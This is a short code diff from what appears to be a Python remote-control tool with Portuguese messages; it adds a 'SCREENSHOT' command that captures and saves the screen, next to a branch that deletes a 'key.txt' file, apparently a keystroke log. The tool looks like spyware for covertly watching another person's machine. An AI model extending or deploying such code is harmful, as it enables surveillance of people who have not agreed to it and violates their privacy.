@@ -46,6 +46,10 @@ while True:
         arquivo.close()
         os.remove('key.txt')
 
+    elif(mensagem_decode.upper() == "SCREENSHOT"):
+        fig = pyautogui.screenshot(r)
+        fig.save(r'fig.png')
+
     else:
         mensagem = "\nComando nao reconhecido no sistema, tente novamente"
 
